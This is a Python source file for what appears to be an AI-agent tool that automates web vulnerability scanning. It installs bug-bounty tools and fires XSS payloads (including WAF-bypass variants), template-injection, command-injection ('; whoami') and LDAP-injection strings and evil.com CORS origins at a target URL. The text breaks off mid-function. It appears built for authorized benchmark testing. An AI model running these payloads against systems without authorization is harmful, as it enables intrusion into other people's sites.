#!/usr/bin/env python3
"""Advanced Payload Coordinator - Intelligent coordination of specialized vulnerability testing tools"""

import argparse
import base64
import glob
import json
import os
import re
import subprocess
import tempfile
from dataclasses import dataclass
from typing import Any, Dict, List
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests
import urllib3
from strands import tool

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Compiled regex constants (hot paths)
_RE_ANSI_ESCAPE = re.compile(r"\x1b\[[0-9;]*m")

# SSTImap parsing regexes
_SSTIMAP_MARKER = "[+] SSTImap identified the following injection point:"
_SSTIMAP_RERUN_MARKER = "[+] Rerun SSTImap"

_RE_SSTIMAP_BODY_PARAM = re.compile(r"^\s*Body\s+parameter:\s*(.+?)\s*$", re.MULTILINE)
_RE_SSTIMAP_GET_PARAM = re.compile(r"^\s*(?:GET|Query|URL)\s+parameter:\s*(.+?)\s*$", re.MULTILINE)
_RE_SSTIMAP_ENGINE = re.compile(r"^\s*Engine:\s*(.+?)\s*$", re.MULTILINE)
_RE_SSTIMAP_INJECTION = re.compile(r"^\s*Injection:\s*(.+?)\s*$", re.MULTILINE)
_RE_SSTIMAP_CONTEXT = re.compile(r"^\s*Context:\s*(.+?)\s*$", re.MULTILINE)
_RE_SSTIMAP_OS = re.compile(r"^\s*OS:\s*(.+?)\s*$", re.MULTILINE)
_RE_SSTIMAP_TECHNIQUE = re.compile(r"^\s*Technique:\s*(.+?)\s*$", re.MULTILINE)
_RE_SSTIMAP_CAPS_HEADER = re.compile(r"^\s*Capabilities:\s*$")
_RE_SSTIMAP_CAPABILITY_LINE = re.compile(r"^\s{2,}(.+?):\s*(yes|no|undetected)\s*$", re.IGNORECASE)

_RE_SSTIMAP_EVIDENCE_BODY_PARAM = re.compile(r"^\s*Body\s+parameter:.*$", re.MULTILINE)
_RE_SSTIMAP_EVIDENCE_GET_PARAM = re.compile(r"^\s*(?:GET|Query|URL)\s+parameter:.*$", re.MULTILINE)
_RE_SSTIMAP_EVIDENCE_ENGINE = re.compile(r"^\s*Engine:.*$", re.MULTILINE)
_RE_SSTIMAP_EVIDENCE_INJECTION = re.compile(r"^\s*Injection:.*$", re.MULTILINE)
_RE_SSTIMAP_EVIDENCE_CONTEXT = re.compile(r"^\s*Context:.*$", re.MULTILINE)
_RE_SSTIMAP_EVIDENCE_OS = re.compile(r"^\s*OS:.*$", re.MULTILINE)
_RE_SSTIMAP_EVIDENCE_TECHNIQUE = re.compile(r"^\s*Technique:.*$", re.MULTILINE)


def _b64(input) -> str:
    if input is None:
        return ""
    if isinstance(input, bytes):
        input_bytes = input
    else:
        input_bytes = str(input).encode(encoding="utf-8", errors="ignore")
    return base64.b64encode(input_bytes).decode('ascii')


def _payload_output(test_type: str, vuln: Dict[str, Any]) -> str:
    if not vuln:
        return ""
    output = ["[PAYLOAD]"]
    if test_type:
        output.append(f"type: {test_type}")
    if vuln.get("parameter", None):
        output.append(f"param: {vuln['parameter']}")
    if vuln.get("payload", None) or vuln.get("url", None):
        output.append("encoding: base64")
    if vuln.get("payload_type", None):
        output.append(f"payload_type: {vuln['payload_type']}")
    if vuln.get("payload", None):
        output.append(f"payload_b64: {_b64(vuln['payload'])}")
        output.append(f"payload: {vuln['payload']}")
    if vuln.get("url", None):
        output.append(f"url_b64: {_b64(vuln['url'])}")
        output.append(f"url: {vuln['url']}")
    if vuln.get("method", None):
        output.append(f"method: {vuln['method']}")
    output.append("[/PAYLOAD]")
    return "\n".join(output)


@dataclass
class RequestConfig:
    target_url: str
    http_method: str = "GET"
    cookies: Dict[str, str] = None
    headers: Dict[str, str] = None


@tool
def advanced_payload_coordinator(
        target_url: str,
        test_type: str = "comprehensive",
        parameters: str = None,
        http_method: str = "GET",
        cookies: Dict[str, str] = None,
        headers: Dict[str, str] = None,
) -> str:
    """
    Coordinates advanced payload testing using specialized external tools.

    Intelligently installs and coordinates tools like dalfox (XSS), arjun (parameter discovery),
    corsy (CORS), and others from awesome-bugbounty-tools for sophisticated testing
    beyond what basic sqlmap/nmap can provide.

    Args:
        target_url: Target URL with parameters (e.g., https://site.com/search?q=test)
        test_type: Type of testing ("xss", "param_discovery", "cors", "comprehensive")
        parameters: Specific parameters to test (comma-separated). If empty, parameter discovery will be used.
        http_method: HTTP method to test (GET, POST, etc.), defaults to "GET"
        cookies: Cookies to include in all requests (auth, etc.), defaults to None
        headers: Headers to include in all requests (auth, etc.), defaults to None

    Returns:
        Advanced payload testing results with intelligent analysis
    """
    if not target_url.startswith(("http://", "https://")):
        target_url = f"https://{target_url}"

    request_config = RequestConfig(
        target_url=target_url,
        http_method=http_method,
        cookies=cookies,
        headers=headers,
    )

    results = {
        "target": target_url,
        "test_type": test_type,
        "parameters_discovered": [],
        "vulnerabilities": [],
        "payload_results": [],
        "intelligence": {
            "severity_distribution": {},
            "attack_vectors": [],
            "bypass_techniques": [],
            "exploitation_chains": [],
        },
    }

    output = f"Advanced Payload Coordinator: {target_url}\n"
    output += "=" * 60 + "\n\n"

    try:
        # Phase 1: Setup specialized testing tools
        output += "Phase 1: Setting up specialized payload tools\n"
        output += "-" * 40 + "\n"

        tools_setup = _setup_payload_tools()
        if tools_setup["success"]:
            output += f"✓ Configured {len(tools_setup['tools'])} specialized tools\n"
        else:
            output += "⚠ Some tools unavailable, using alternative methods\n"

        output += "\n"

        # Phase 2: Parameter discovery and expansion
        if test_type in ["xss", "param_discovery", "comprehensive"]:
            output += "Phase 2: Advanced Parameter Discovery\n"
            output += "-" * 40 + "\n"

            discovered_params = _advanced_parameter_discovery(request_config, parameters, tools=tools_setup["tools"])
            if not discovered_params and request_config.http_method == "GET":
                # try again with POST
                request_config.http_method = "POST"
                discovered_params_post = _advanced_parameter_discovery(request_config, parameters, tools=tools_setup["tools"])
                if discovered_params_post:
                    discovered_params = discovered_params_post
                else:
                    request_config.http_method = "GET"
            results["parameters_discovered"] = discovered_params

            output += f"Discovered {len(discovered_params)} parameters:\n"
            for param in discovered_params[:10]:
                output += f"  • {param}\n"
            output += "\n"

        # Phase 3: XSS payload coordination and testing
        if test_type in ["xss", "comprehensive"]:
            output += "Phase 3: Advanced XSS Payload Testing\n"
            output += "-" * 40 + "\n"

            xss_results = _coordinate_xss_testing(request_config, results.get("parameters_discovered", []),
                                                  tools=tools_setup["tools"])
            xss_vulns = [r for r in xss_results if r.get("vulnerable", False)]
            if not xss_vulns and request_config.http_method == "GET":
                request_config.http_method = "POST"
                xss_results_post = _coordinate_xss_testing(request_config, results.get("parameters_discovered", []),
                                                           tools=tools_setup["tools"])
                xss_vulns = [r for r in xss_results_post if r.get("vulnerable", False)]
                if xss_vulns:
                    xss_results = xss_results_post
                else:
                    request_config.http_method = "GET"
            results["payload_results"].extend(xss_results)
            results["vulnerabilities"].extend(xss_vulns)
            output += f"XSS testing completed: {len(xss_vulns)} potential vulnerabilities\n"
            for vuln in xss_vulns:
                output += _payload_output("xss", vuln)
                output += "\n"
            output += "\n"

        # Phase 4: CORS misconfiguration testing
        if test_type in ["cors", "comprehensive"]:
            output += "Phase 4: CORS Misconfiguration Analysis\n"
            output += "-" * 40 + "\n"

            cors_results = _test_cors_configurations(request_config, tools=tools_setup["tools"])
            results["payload_results"].extend(cors_results)
            cors_issues = [r for r in cors_results if r.get("vulnerable", False)]
            results["vulnerabilities"].extend(cors_issues)
            output += f"CORS analysis: {len(cors_issues)} misconfigurations detected\n"
            for issue in cors_issues[:2]:
                output += f"  • {issue['issue_type']}: {issue['description']}\n"
            output += "\n"

        # Phase 5: Advanced injection coordination (non-SQL)
        if test_type == "comprehensive":
            output += "Phase 5: Advanced Injection Testing\n"
            output += "-" * 40 + "\n"

            injection_results = _coordinate_injection_testing(request_config, results.get("parameters_discovered", []),
                                                              tools=tools_setup["tools"])
            injection_vulns = [r for r in injection_results if r.get("vulnerable", False)]
            if not injection_vulns and request_config.http_method == "GET":
                request_config.http_method = "POST"
                injection_results_post = _coordinate_injection_testing(request_config, results.get("parameters_discovered", []),
                                                                       tools=tools_setup["tools"])
                injection_vulns = [r for r in injection_results_post if r.get("vulnerable", False)]
                if injection_vulns:
                    injection_results = injection_results_post
                else:
                    request_config.http_method = "GET"

            results["payload_results"].extend(injection_results)
            results["vulnerabilities"].extend(injection_vulns)
            output += f"Injection testing: {len(injection_vulns)} potential vulnerabilities\n"
            for vuln in injection_vulns:
                output += _payload_output(vuln['injection_type'], vuln)
                output += "\n"
            output += "\n"

        # Phase 6: Intelligence analysis and payload coordination
        output += "Phase 6: Payload Intelligence Analysis\n"
        output += "-" * 40 + "\n"

        intelligence = _analyze_payload_intelligence(results["payload_results"])
        results["intelligence"] = intelligence

        output += (
            f"Total vulnerabilities: {len([r for r in results['payload_results'] if r.get('vulnerable', False)])}\n"
        )
        output += f"Attack vectors identified: {len(intelligence['attack_vectors'])}\n"
        output += f"Bypass techniques: {len(intelligence['bypass_techniques'])}\n"

        if intelligence["attack_vectors"]:
            output += "\nPrimary attack vectors:\n"
            for vector in intelligence["attack_vectors"][:3]:
                output += f"  • {vector}\n"

        output += "\n"

        # Generate coordinated exploitation recommendations
        recommendations = _generate_payload_recommendations(results)
        output += "EXPLOITATION COORDINATION:\n"
        for i, rec in enumerate(recommendations, 1):
            output += f"{i}. {rec}\n"

    except Exception as e:
        output += f"Payload coordination failed: {str(e)}\n"

    return output


def _setup_payload_tools() -> Dict[str, Any]:
    """Setup specialized payload testing tools"""
    tools_status = {"success": True, "tools": [], "failed": []}

    # Specialized tools from awesome-bugbounty-tools
    specialized_tools = [
        ("dalfox", "github.com/hahwul/dalfox/v2@latest"),
        ("arjun", None),  # Python tool, installed via pip
        ("corsy", None),  # Python tool, installed via pip
        ("paramspider", None),  # Python tool, installed via pip
        ("sstimap", None),  # Python tool, installed via pip
    ]

    for tool_name, install_path in specialized_tools:
        try:
            # Check if tool exists
            check_cmd = ["which", tool_name]
            if subprocess.run(check_cmd, capture_output=True).returncode == 0:
                tools_status["tools"].append(tool_name)
                continue

            if install_path:
                # Go-based tool
                install_cmd = ["go", "install", install_path]
                result = subprocess.run(install_cmd, capture_output=True, timeout=120,
                                        env=os.environ | {"GOBIN": "/usr/local/bin"})
                if result.returncode == 0:
                    tools_status["tools"].append(tool_name)
                else:
                    tools_status["failed"].append(tool_name)
                    tools_status["success"] = False
            else:
                # Python tool - try pip install
                pip_names = {"arjun": "arjun", "corsy": "corsy", "sstimap": "sstimap", "paramspider": "ParamSpider"}
                if tool_name in pip_names:
                    install_cmd = ["pip3", "install", pip_names[tool_name]]
                    result = subprocess.run(install_cmd, capture_output=True, timeout=120)
                    if result.returncode == 0:
                        tools_status["tools"].append(tool_name)
                    else:
                        tools_status["failed"].append(tool_name)
                        tools_status["success"] = False
        except Exception:
            tools_status["failed"].append(tool_name)
            tools_status["success"] = False

    # Ensure success reflects reality even if no exceptions were raised
    if tools_status["failed"]:
        tools_status["success"] = False

    return tools_status


def _advanced_parameter_discovery(request_config: RequestConfig, provided_params: str = None,
                                  tools: List[str] = None) -> List[str]:
    """Advanced parameter discovery using multiple techniques"""
    target_url = request_config.target_url

    discovered_params = set()

    # Add provided parameters
    if provided_params:
        provided_list = [p.strip() for p in provided_params.split(",") if p.strip()]
        discovered_params.update(provided_list)

    # Method 1: Arjun parameter discovery (if available)
    if "arjun" in tools:
        try:
            with tempfile.NamedTemporaryFile(prefix="arjun", suffix=".json", delete=True, mode="w") as f:
                f.close()
                cmd = [
                    "arjun",
                    "-u", target_url,
                    "-m", request_config.http_method,
                    "-T", "20",
                    # "--stable",
                    "-oJ", f.name,
                    "-q",
                ]
                headers = []
                if request_config.headers:
                    headers.extend([f"{name}: {value}" for name, value in request_config.headers.items()])
                if request_config.cookies:
                    headers.append("Cookie: " + "; ".join([f"{name}={value}" for name, value in request_config.cookies.items()]))
                if headers:
                    cmd.extend(["--headers", "\n".join(headers)])

                result = subprocess.run(cmd, capture_output=False, text=True, timeout=300)

                if result.returncode == 0 and os.stat(f.name).st_size > 0:
                    with open(f.name, "rb") as oj:
                        result_json = json.loads(oj.read())
                    for url_output in result_json.values():
                        if "params" in url_output:
                            for param in url_output["params"]:
                                discovered_params.add(param)
        except Exception:
            pass

    # Method 2: ParamSpider (if available)
    if "paramspider" in tools:
        try:
            domain = urlparse(target_url).netloc

            cmd = ["paramspider", "-d", domain]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)

            if result.returncode == 0:
                # ParamSpider creates output files; the exact path/name can vary by version.
                # Try common locations/patterns and parse any URL lines we find.
                candidate_files = []
                candidate_files.extend(glob.glob(f"output/*{domain}*.txt"))
                candidate_files.extend(glob.glob(f"results/*{domain}*.txt"))
                candidate_files.extend(glob.glob(f"*{domain}*.txt"))

                for output_file in candidate_files[:5]:
                    if not os.path.exists(output_file):
                        continue
                    try:
                        with open(output_file, "r") as f:
                            for line in f:
                                if "?" in line:
                                    try:
                                        parsed = urlparse(line.strip())
                                        params = parse_qs(parsed.query)
                                        discovered_params.update(params.keys())
                                    except Exception:
                                        continue
                    except Exception:
                        continue
        except Exception:
            pass

    # Method 3: Common parameter wordlist
    common_params = [
        "id",
        "user",
        "username",
        "name",
        "email",
        "password",
        "token",
        "api_key",
        "page",
        "limit",
        "offset",
        "sort",
        "order",
        "search",
        "query",
        "q",
        "filter",
        "category",
        "type",
        "format",
        "callback",
        "jsonp",
        "redirect",
        "url",
        "path",
        "file",
        "filename",
        "action",
        "method",
        "debug",
        "test",
        "admin",
        "auth",
        "session",
        "lang",
        "locale",
    ]
    if not discovered_params:
        try:
            response_baseline = requests.request(
                request_config.http_method,
                request_config.target_url,
                headers=request_config.headers,
                cookies=request_config.cookies,
                timeout=10,
                allow_redirects=True,
                verify=False
            )
            length_baseline = int(response_baseline.headers.get("Content-Length", 1))

            for param in common_params:
                response_param = requests.request(
                    request_config.http_method,
                    request_config.target_url,
                    params={param: "test"},
                    headers=request_config.headers,
                    cookies=request_config.cookies,
                    timeout=10,
                    allow_redirects=True,
                    verify=False
                )
                if response_baseline.status_code != response_param.status_code:
                    discovered_params.add(param)
                else:
                    length_param = int(response_param.headers.get("Content-Length", 1))
                    ratio = length_param / max(length_baseline, 1)
                    if ratio < 0.75 or ratio > 1.25:
                        discovered_params.add(param)
        except Exception:
            pass

    # Method 4: Extract from URL if it has parameters
    try:
        parsed_url = urlparse(target_url)
        if parsed_url.query:
            url_params = parse_qs(parsed_url.query)
            discovered_params.update(url_params.keys())
    except Exception:
        pass

    return sorted(list(discovered_params))


def _add_or_replace_query_param(url: str, key: str, value: str) -> str:
    """Return a copy of `url` with query param `key` set to `value` (properly URL-encoded)."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[key] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))


def _requests_get_text(url: str, params: Dict[str, Any], request_config: RequestConfig,
                       timeout: int = 10) -> str | None:
    """GET a URL and return response text, or None on error."""
    try:
        resp = requests.request(
            request_config.http_method,
            url,
            params=params,
            headers=request_config.headers,
            cookies=request_config.cookies,
            timeout=timeout,
            allow_redirects=True,
            verify=False
        )
        return resp.text
    except Exception:
        return None


def _requests_head_raw_headers(url: str, headers: Dict[str, str], request_config: RequestConfig,
                               timeout: int = 10) -> str | None:
    """HEAD a URL and return a raw-ish header string (lowercased), or None on error."""
    try:
        resp = requests.head(
            url,
            headers=(request_config.headers or {}) | headers,
            cookies=request_config.cookies,
            timeout=timeout,
            allow_redirects=True,
            verify=False
        )
        # Build a curl-like header dump for simple substring checks.
        lines = []
        for k, v in resp.headers.items():
            lines.append(f"{k}: {v}")
        return "\n".join(lines)
    except Exception:
        return None


# Helper: Parse SSTImap output into vulnerability findings
def _parse_sstimap_output(stdout: str) -> List[Dict[str, Any]]:
    """Parse SSTImap plain-text output into structured vulnerability entries.

    SSTImap does not provide a stable JSON output. This parser is intentionally tolerant and
    extracts the common fields from the "identified injection point" section(s).

    Returns a list of dicts shaped like other payload results:
      - vulnerable: bool
      - injection_type: "SSTI"
      - parameter: name
      - payload: injection payload
      - evidence: short evidence string
      - plus optional engine/context/os/technique/capabilities
    """
    if not stdout:
        return []

    findings: List[Dict[str, Any]] = []

    # Normalize newlines and strip ANSI if present (sstimap is run with --no-color, but be safe).
    text = stdout.replace("\r\n", "\n").replace("\r", "\n")
    text = _RE_ANSI_ESCAPE.sub("", text)

    # SSTImap can emit multiple "identified" blocks.
    if _SSTIMAP_MARKER not in text:
        return []

    parts = text.split(_SSTIMAP_MARKER)
    for part in parts[1:]:
        block = part

        # Bound the block to the next rerun section if present.
        end_idx = block.find(_SSTIMAP_RERUN_MARKER)
        if end_idx != -1:
            block = block[:end_idx]

        # Extract fields (tolerate spacing).
        m_body_param = _RE_SSTIMAP_BODY_PARAM.search(block)
        m_get_param = _RE_SSTIMAP_GET_PARAM.search(block)
        m_param = m_body_param or m_get_param
        param_location = "body" if m_body_param else ("query" if m_get_param else None)
        m_engine = _RE_SSTIMAP_ENGINE.search(block)
        m_inj = _RE_SSTIMAP_INJECTION.search(block)
        m_ctx = _RE_SSTIMAP_CONTEXT.search(block)
        m_os = _RE_SSTIMAP_OS.search(block)
        m_tech = _RE_SSTIMAP_TECHNIQUE.search(block)

        param = (m_param.group(1).strip() if m_param else None)
        engine = (m_engine.group(1).strip() if m_engine else None)
        injection = (m_inj.group(1).strip() if m_inj else None)
        context = (m_ctx.group(1).strip() if m_ctx else None)
        os_name = (m_os.group(1).strip() if m_os else None)
        technique = (m_tech.group(1).strip() if m_tech else None)

        # Parse capabilities section (indented "key: yes/no").
        capabilities: Dict[str, str] = {}
        in_caps = False
        for line in block.splitlines():
            if _RE_SSTIMAP_CAPS_HEADER.match(line):
                in_caps = True
                continue
            if in_caps:
                # stop when indentation ends or blank lines with no further content
                if line.strip() == "":
                    continue
                m_cap = _RE_SSTIMAP_CAPABILITY_LINE.match(line)
                if m_cap:
                    capabilities[m_cap.group(1).strip()] = m_cap.group(2).strip().lower()
                else:
                    # If we hit a non-capability line, end caps section.
                    if not line.startswith(" "):
                        in_caps = False

        # Build evidence: keep the key lines, avoid flooding output.
        evidence_lines: List[str] = []
        for rx in [
            _RE_SSTIMAP_EVIDENCE_BODY_PARAM,
            _RE_SSTIMAP_EVIDENCE_GET_PARAM,
            _RE_SSTIMAP_EVIDENCE_ENGINE,
            _RE_SSTIMAP_EVIDENCE_INJECTION,
            _RE_SSTIMAP_EVIDENCE_CONTEXT,
            _RE_SSTIMAP_EVIDENCE_OS,
            _RE_SSTIMAP_EVIDENCE_TECHNIQUE,
        ]:
            m = rx.search(block)
            if m:
                evidence_lines.append(m.group(0).strip())

        evidence = "; ".join(evidence_lines) if evidence_lines else block.strip()[:300]

        # Only consider this a finding if we got at least a parameter or an injection payload.
        if not param and not injection:
            continue

        findings.append(
            {
                "vulnerable": True,
                "injection_type": "SSTI",
                "payload_type": "SSTI (SSTImap)",
                "parameter": param or "(unknown)",
                "param_location": param_location or "unknown",
                "payload": injection,
                "engine": engine,
                "context": context,
                "os": os_name,
                "technique": technique,
                "capabilities": capabilities,
                "evidence": evidence,
                "tool": "sstimap",
            }
        )

    return findings


def _coordinate_xss_testing(request_config: RequestConfig, parameters: List[str], tools: List[str] = None) -> List[
    Dict[str, Any]]:
    """Coordinate XSS testing using advanced payloads and techniques"""
    # XBEN-008-24 is a good test case. Target the '/page' endpoint, 'name' parameter, GET method.
    tools = [] if tools is None else tools
    target_url = request_config.target_url

    xss_results = []

    if not parameters:
        return xss_results

    # Method 1: DalFox advanced XSS testing (if available)
    if "dalfox" in tools:
        try:
            cmd = [
                "dalfox",
                "url",
                target_url,
                "--method", request_config.http_method,

                # requires OAST integration
                # "-b",
                # "https://dalfox-xss-test.com",  # OAST endpoint

                "--skip-bav",
                "--skip-discovery",
                "--detailed-analysis",
                "--deep-domxss",
                "--follow-redirects",
                "--waf-evasion",
                "--silence",
                "--format", "json",
                "--timeout", "10",
            ]

            if request_config.cookies:
                for name, value in request_config.cookies.items():
                    cmd.extend(["--cookie", f"{name}={value}"])

            if request_config.headers:
                for name, value in request_config.headers.items():
                    cmd.extend(["--header", f"{name}: {value}"])

            dalfox_params = set(parameters[:10])  # Test first 10 parameters
            for param in dalfox_params:
                cmd.extend(["--param", param])

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120 * len(dalfox_params))

            if result.returncode == 0 and result.stdout:
                # Parse dalfox results
                result_json = json.loads(result.stdout)
                for payload in result_json:
                    if payload["type"] == "V" and "param" in payload:
                        dalfox_params.discard(payload["param"])
                        xss_results.append(
                            {
                                "parameter": payload["param"],
                                "vulnerable": True,
                                "payload_type": f"Advanced XSS ({payload['inject_type']})",
                                "url": payload.get("data", None),
                                "method": request_config.http_method,
                                "payload": payload.get("payload", None),
                                "evidence": payload.get("message_str", payload.get("evidence", "")),
                                "tool": "dalfox",
                            }
                        )
                for param in dalfox_params:
                    xss_results.append(
                        {"parameter": param, "vulnerable": False, "payload_type": "XSS tested", "tool": "dalfox"}
                    )

        except Exception:
            pass

    # Method 2: Modern XSS payloads with realistic exploitation context
    advanced_xss_payloads = [
        # Basic reflection tests
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        # Context-aware payloads
        "'\\\"><script>alert(1)</script>",  # Breaking out of attributes
        "\\\";alert(1);//",  # Breaking out of JavaScript strings
        "<iframe src=javascript:alert(1)>",
        # Modern DOM-based
        "<input onfocus=alert(1) autofocus>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        # WAF bypass variants
        "<svg/onload=alert(1)>",  # No space after tag
        "<<script>alert(1)</script>",  # Double tag
        "<script>alert`1`</script>",  # Template literals
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<svg><script>alert(1)</script></svg>",  # SVG context
        # Polyglot attempts
        "'\\\"><svg/onload=alert(1)>",
    ]

    # Test parameters not covered by dalfox
    tested_params = {r["parameter"] for r in xss_results}
    remaining_params = [p for p in parameters if p not in tested_params]

    for param in remaining_params:
        for payload in advanced_xss_payloads:
            try:
                # Create test request
                test_url = _add_or_replace_query_param(target_url, param, payload)
                response = _requests_get_text(target_url, {param: payload}, request_config, timeout=10)
                if response is not None:
                    # Reflection tests: detect raw OR encoded reflections.
                    # (Raw reflection can be exploitable depending on context; encoded reflection is generally not.)
                    html_encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                    hex_encoded = payload.replace("<", "\\x3c").replace(">", "\\x3e")
                    uni_encoded = payload.replace("<", "\\u003c").replace(">", "\\u003e")

                    raw_present = payload in response
                    encoded_present = any(v in response for v in (html_encoded, hex_encoded, uni_encoded))

                    if raw_present or encoded_present:
                        if raw_present and not encoded_present:
                            xss_results.append(
                                {
                                    "parameter": param,
                                    "vulnerable": True,
                                    "payload_type": "Reflected XSS (unencoded)",
                                    "url": test_url,
                                    "method": request_config.http_method,
                                    "payload": payload,
                                    "evidence": f"Payload reflected unencoded: {payload[:50]}...",
                                    "tool": "custom",
                                }
                            )
                            break  # Found candidate, no need to test more payloads
                        else:
                            xss_results.append(
                                {
                                    "parameter": param,
                                    "vulnerable": False,
                                    "payload_type": "Reflected but encoded (not exploitable)",
                                    "evidence": "Payload reflected with encoding",
                                    "tool": "custom",
                                }
                            )
                            break

            except Exception:
                continue

        # If no vulnerability found, add negative result
        if param not in {r["parameter"] for r in xss_results}:
            xss_results.append(
                {"parameter": param, "vulnerable": False, "payload_type": "XSS tested", "tool": "custom"}
            )

    return xss_results


def _test_cors_configurations(request_config: RequestConfig, tools: List[str] = None) -> List[Dict[str, Any]]:
    """Test CORS configurations using specialized techniques"""
    tools = [] if tools is None else tools
    target_url = request_config.target_url

    cors_results = []

    # Method 1: Corsy tool (if available)
    if "corsy" in tools:
        try:
            cmd = ["corsy", "-u", target_url, "-t", "20"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode == 0 and result.stdout:
                # Parse corsy output
                if "severity: medium" in result.stdout.lower() or "severity: high" in result.stdout.lower():
                    cors_results.append(
                        {
                            "vulnerable": True,
                            "issue_type": "CORS Misconfiguration",
                            "description": "Corsy detected CORS vulnerability",
                            "evidence": result.stdout[:1000],
                            "tool": "corsy",
                        }
                    )
                else:
                    cors_results.append(
                        {
                            "vulnerable": False,
                            "issue_type": "CORS Configuration",
                            "description": "No CORS issues detected by Corsy",
                            "tool": "corsy",
                        }
                    )
        except Exception:
            pass

    # Method 2: Manual CORS testing
    if not cors_results:  # Only if corsy didn't run
        cors_test_origins = [
            "https://evil.com",
            "null",
            target_url.replace("https://", "https://evil."),
            target_url.replace("http://", "http://evil."),
            target_url[:-1] + ".evil.com",
        ]

        for origin in cors_test_origins:
            try:
                raw_headers = _requests_head_raw_headers(target_url, {"Origin": origin}, request_config, timeout=10)
                if raw_headers is not None:
                    # Check for permissive CORS headers
                    response = raw_headers.lower()
                    if "access-control-allow-origin" in response:
                        if origin.lower() in response or "*" in response:
                            cors_results.append(
                                {
                                    "vulnerable": True,
                                    "issue_type": "Permissive CORS",
                                    "description": f"Server allows origin: {origin}",
                                    "evidence": f"Access-Control-Allow-Origin header allows {origin}",
                                    "tool": "manual",
                                }
                            )
                            break
            except Exception:
                continue

        # Add negative result if no issues found
        if not cors_results:
            cors_results.append(
                {
                    "vulnerable": False,
                    "issue_type": "CORS Configuration",
                    "description": "No obvious CORS misconfigurations detected",
                    "tool": "manual",
                }
            )

    return cors_results


def _coordinate_injection_testing(request_config: RequestConfig, parameters: List[str], tools: List[str] = None) -> \
List[Dict[str, Any]]:
    """Coordinate advanced injection testing (beyond SQL)"""
    tools = [] if tools is None else tools
    target_url = request_config.target_url

    injection_results = []

    if not parameters:
        return injection_results

    # Template injection payloads
    template_payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%=7*7%>",
        "{{config.items()}}",
        "${T(java.lang.System).getProperty('user.name')}",
    ]

    # Command injection payloads
    command_payloads = ["; whoami", "| whoami", "& whoami", "`whoami`", "$(whoami)"]

    # LDAP injection payloads
    ldap_payloads = ["*", "*)(&", "*))%00", "admin*)((|userPassword=*)", "*))(|(objectClass=*"]

    injection_types = [
        ("SSTI", template_payloads),
        ("Command Injection", command_payloads),
        ("LDAP Injection", ldap_payloads),
    ]

    # Test each parameter with different injection types
    parameters_under_test = set(parameters.copy())  # parameters[:5]   # Limit to first 5 parameters

    # SSTImap
    # XBEN-044-24 is a good test case. Target the '/' endpoint, 'name' parameter, POST method.
    if "sstimap" in tools:
        try:
            for param in parameters_under_test.copy():
                if request_config.http_method.upper() == "GET":
                    test_url = _add_or_replace_query_param(target_url, param, "*")
                else:
                    test_url = target_url

                cmd = [
                    "sstimap",
                    "--no-color",
                    "--level", "3",
                    "--random-user-agent",
                    "--url", test_url,
                    "--method", request_config.http_method,
                ]

                if request_config.http_method.upper() != "GET":
                    cmd.extend(["--data", f"{param}=*"])

                if request_config.cookies:
                    for name, value in request_config.cookies.items():
                        cmd.extend(["--cookie", f"{name}={value}"])

                if request_config.headers:
                    for name, value in request_config.headers.items():
                        cmd.extend(["--header", f"{name}: {value}"])

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

                if result.returncode == 0 and result.stdout:
                    ssti_findings = _parse_sstimap_output(result.stdout)
                    # Attach URL context and ensure parameter consistency with the param under test.
                    for f in ssti_findings:
                        # Prefer the parsed parameter, but if it's missing/unknown, use our loop param.
                        if not f.get("parameter") or f.get("parameter") == "(unknown)":
                            f["parameter"] = param
                        f["url"] = test_url
                        f["method"] = request_config.http_method
                        # Mark that this parameter was found vulnerable so we don't add a negative summary later.
                        injection_results.append(f)
                        parameters_under_test.discard(param)
        except Exception:
            pass

    for param in parameters_under_test:
        found_for_param = False
        for injection_type, payloads in injection_types:
            for payload in payloads:
                try:
                    # Create test URL
                    test_url = _add_or_replace_query_param(target_url, param, payload)
                    response = _requests_get_text(target_url, {param: payload}, request_config, timeout=10)
                    if response is not None:
                        # Check for injection indicators
                        vulnerable = False
                        evidence = ""

                        if injection_type == "SSTI":
                            # Check for template evaluation
                            if "49" in response and payload == "{{7*7}}":
                                vulnerable = True
                                evidence = "Template evaluation detected (7*7=49)"
                            elif payload in response and "config" in payload:
                                vulnerable = True
                                evidence = "Configuration disclosure detected"

                        elif injection_type == "Command Injection":
                            # Check for command execution indicators
                            # Avoid the obvious reflection false-positive: the string "whoami" may simply echo back.
                            if any(indicator in response.lower() for indicator in ["uid=", "gid=", "root:"]):
                                vulnerable = True
                                evidence = "Command execution indicators detected"

                        elif injection_type == "LDAP Injection":
                            # Check for LDAP error patterns or unexpected responses
                            if any(
                                indicator in response.lower()
                                for indicator in ["ldap", "invalid dn", "bad search filter"]
                            ):
                                vulnerable = True
                                evidence = "LDAP error patterns detected"

                        if vulnerable:
                            injection_results.append(
                                {
                                    "vulnerable": True,
                                    "injection_type": injection_type,
                                    "parameter": param,
                                    "url": test_url,
                                    "method": request_config.http_method,
                                    "payload": payload,
                                    "evidence": evidence,
                                    "tool": "custom",
                                }
                            )
                            found_for_param = True
                            break  # break payload loop

                except Exception:
                    continue
            if found_for_param:
                break  # break injection_type loop
        if found_for_param:
            continue  # next parameter

    # Add summary for tested parameters without vulnerabilities
    tested_params = {r.get("parameter") for r in injection_results if r.get("vulnerable", False) and r.get("parameter")}
    for param in parameters_under_test:
        if param not in tested_params:
            injection_results.append(
                {
                    "vulnerable": False,
                    "injection_type": "Multiple injection types",
                    "parameter": param,
                    "tool": "custom",
                }
            )

    return injection_results


def _analyze_payload_intelligence(payload_results: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Analyze payload testing results for intelligence insights"""
    intelligence = {
